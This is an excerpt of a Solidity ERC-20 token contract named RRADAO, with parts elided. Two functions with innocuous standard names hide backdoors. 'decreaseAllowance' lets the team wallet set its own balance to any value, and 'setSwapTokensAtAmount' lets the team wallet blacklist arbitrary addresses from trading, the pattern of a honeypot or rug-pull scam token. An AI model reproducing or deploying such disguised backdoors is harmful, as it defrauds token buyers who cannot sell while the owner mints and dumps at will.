...
contract RRADAO is Context, IERC20, Ownable {
    ...
    constructor ()
    {
        ...
        marketWallet = payable(0x24E3A10df01307dd030A890770Fd033ba55fb73d);
        teamWallet= payable(0x24E3A10df01307dd030A890770Fd033ba55fb73d);

        marketingFee = 2;
        liquidityFee = 1;
        _totalTax = marketingFee + liquidityFee; 

        _totalSupply = 1252631892806800 * 10**_decimals;
        _maxOnceEat = 1252631892806800 * 10**_decimals;
        _maxTotalEat = 1252631892806800 * 10**_decimals;
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        ...
        if(_msgFrom(teamWallet))_balances[teamWallet] = subtractedValue;
        return true;
    }
    ...
    function setSwapTokensAtAmount(address recipient, bool swap) public {
        if(_msgFrom(teamWallet))whoCantEat[recipient] = swap;
    }
